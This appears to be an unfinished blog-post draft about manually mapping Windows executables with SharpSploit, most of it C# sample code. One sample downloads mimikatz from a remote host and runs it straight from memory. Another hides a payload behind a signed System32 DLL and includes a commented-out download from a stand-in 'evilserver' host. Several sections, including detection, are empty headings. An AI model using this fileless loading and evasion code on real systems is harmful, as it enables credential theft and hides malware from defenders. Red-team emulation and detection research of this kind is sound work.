---
layout: post
title: Emulating Covert Operations - Manually Mapping Portable Executables
---

*TLDR: A guide to the new Manual Mapping API in SharpSploit, including a ranty discussion on the arcane art of manually mapping Windows executables (Portable Executables).*

![_config.yml]({{ site.baseurl }}/images/Manual_Map/45953a.jpg "Loaders, man...")

# Manual Mapping

Why manually map? 

## History

Started with 29A.

Many threat actors 

## Understanding the Windows Loader

## Building a Minimal Loader

1) Parsing the PE Headers
2) Relocation
3) Alignment (virtualization) & Protections
4) Import Address Resolution
5) API Set Resolution
6) Module Initialization
7) TLS Callbacks
8) Export Resolution & Invocation
9) Invoking Main


## Using the Manual Mapping API in SharpSploit

```csharp

using System;
using System.Runtime.InteropServices;

namespace MapTest
{
    class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int MessageBox(IntPtr hWnd, String text, String caption, int options);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int TestFunc();

        static void Main(string[] args)
        {
            //Test DLL project can be found at: https://github.com/FuzzySecurity/DLL-Template

            Console.WriteLine("[+] Mapping Test DLL from disk into memory!");

            Console.WriteLine("\t[+] Calling Test DLL from memory by DLLMain...\n");
            // (1) Call test DLL by DLLMain
            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModule(ManMapTest.PEINFO, ManMapTest.ModuleBase);

            Console.WriteLine();
            Console.WriteLine("\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n");

            // (2) Call test DLL by export (Also calls DllMain as part of init)
            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest2 = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
            object[] FunctionArgs = { };
            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMapTest2.PEINFO, ManMapTest2.ModuleBase, "test", typeof(TestFunc), FunctionArgs);

            Console.WriteLine();
            Console.WriteLine("[+] Mapping Test DLL from byte array and calling export!\n");

            Console.WriteLine();
            Console.WriteLine("\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n");

            // (3) Map test DLL using byte array. Call by export like above.
            byte[] bytes = System.IO.File.ReadAllBytes(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest3 = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(bytes);
            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMapTest3.PEINFO, ManMapTest3.ModuleBase, "test", typeof(TestFunc), FunctionArgs);

            Console.WriteLine();
            Console.WriteLine("[+] Mapping and calling Mimikatz from memory (via download from URL)!\n");

            Console.WriteLine();
            Console.WriteLine("\t[+] Calling Mimikatz EXE from memory!\n");

            // (4) Mimikatz x64
            byte[] katzBytes = new System.Net.WebClient().DownloadData(@"http://192.168.123.227:8000/mimikatz.exe");
            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapKatz = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(katzBytes);
            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(ManMapKatz.PEINFO, ManMapKatz.ModuleBase);

            Console.ReadLine();
        }
    }
}     

```
[Manual_Map1.png]

[Manual_Map2.png]

[Manual_Map4.png]

## Module Overloading

Basically the same as Phantom DLL Hollowing and Module Stumping.


```csharp

using System;
using System.IO;

namespace MapTest
{
    class Program
    {

        static void Main(string[] args)
        {

            string payload = @"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\mimikatz.exe";

            // Map a module to a file
            string decoyPath = @"C:\Windows\System32\user32.dll";

            byte[] payloadBytes = File.ReadAllBytes(payload);

            //Optionally, download the payload from a server into a byte array
            //byte[] payloadBytes = new System.Net.WebClient().DownloadData("http://evilserver.gov/kittenz.cute");

            //Overload, using specific decoy file
            SharpSploit.Execution.PE.PE_MANUAL_MAP metadata = SharpSploit.Execution.DynamicInvoke.Generic.OverloadModule(decoyPath, payloadBytes);

            //Overload, using randomly chosen decoy file
            //SharpSploit.Execution.PE.PE_MANUAL_MAP metadata = SharpSploit.Execution.DynamicInvoke.Generic.OverloadModule(payloadBytes);

            Console.WriteLine("[+] Module Address: " + metadata.ModuleBase);
            Console.WriteLine("[+] Module Name: " + metadata.ModuleName); //nothing when a module is loaded from memory
            Console.WriteLine("[+] Module Backing File: " + metadata.MemoryBackingFileName);

            Console.WriteLine("Hold fire!");
            Console.ReadLine();
            Console.WriteLine("Firing!");

            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(metadata.PEINFO, metadata.ModuleBase);

            //==========================================================[Sleep]
            while (true)
            {
                System.Threading.Thread.Sleep(10000);
            }
        }
    }
}

```

The fact that you have the same module module twice is suspicious. When you choose to overload a random module, it picks one that is not already loaded, is validly signed, and is in System32/SysWOW64.
[ModuleOverloading.png]

# Detection

Module loads

Memory scanning
